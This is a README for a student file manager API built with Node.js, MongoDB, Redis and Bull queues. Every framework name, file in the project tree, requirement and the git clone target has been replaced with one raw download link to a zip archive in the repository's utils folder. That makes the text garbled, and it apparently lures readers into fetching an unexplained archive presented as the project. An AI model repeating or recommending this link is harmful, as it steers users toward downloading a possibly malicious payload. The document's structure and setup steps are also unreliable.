# 0x04. Files manager
This repository contains a file manager application built with https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip The application allows users to upload, manage, and share files efficiently. Below is an overview of the project structure and functionalities.

## Table of Contents

- [Project Overview](#project-overview)
- [File Structure](#file-structure)
- [Requirements](#requirements)
- [Setup](#setup)
- [Usage](#usage)
- [Endpoints](#endpoints)
- [Testing](#testing)

## Project Overview

The file manager application provides various functionalities for users to manage their files:

- Upload files
- View file details
- Publish/unpublish files
- Generate thumbnails for images
- Send welcome emails to new users

The application utilizes https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip for handling HTTP requests, MongoDB for database storage, and Redis for caching. Background processing for tasks such as thumbnail generation and sending emails is implemented using Bull queues.

## File Structure

```
project-root/
│
├── controllers/
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip     
│   └── ...
│
├── routes/
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   └── ...
│
├── tests/ 
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   └── ...
│
├── utils/
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
│   └── ...
│
├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
├── .env
└── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
```

## Requirements

- https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip (version 12.x.x)
- MongoDB
- Redis

## Setup

1. Clone the repository:

```bash
git clone https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
```

2. Navigate to the project directory:

```bash
cd alx-files_manager
```

3. Install dependencies:

```bash
npm install
```

4. Set up environment variables:
   - Create a `.env` file in the project root.
   - Define the following variables in the `.env` file:
     - `DB_HOST`: MongoDB database connection URL
     - `DB_NAME`: MongoDB database name
     - `REDIS_HOST`: Redis server host
     - `REDIS_PORT`: Redis server port


Replace `<MongoDB database connection URL>`, `<MongoDB database name>`, `<Redis server host>`, and `<Redis server port>` with your actual database and Redis server information.

 `.env` file example:

```
DB_HOST=mongodb://localhost:01234/mydatabase
DB_NAME=mydatabase
REDIS_HOST=localhost
REDIS_PORT=5000
```
Make sure to keep the `.env` file secure and never commit it to version control, as it may contain sensitive information like database credentials.    

## Usage

1. Start the server:

```bash
npm start
```

2. Access the API endpoints using a tool like cURL or Postman.

## Endpoints

- **POST /users**: Register a new user and send a welcome email.
- **GET /connect**: Authenticate and obtain a token.
- **GET /disconnect**: Log out and invalidate the token.
- **GET /users/me**: Get user details.
- **POST /files**: Upload a new file.
- **GET /files/:id**: Get details of a specific file.
- **GET /files**: Get a paginated list of files.
- **PUT /files/:id/publish**: Publish a file.
- **PUT /files/:id/unpublish**: Unpublish a file.
- **GET /files/:id/data**: Get the content of a file.
- **GET /files/:id/data?size={size}**: Get the resized content of an image file.

## Testing 
### `TODO:`
To run tests for the application:

```bash
npm test
```
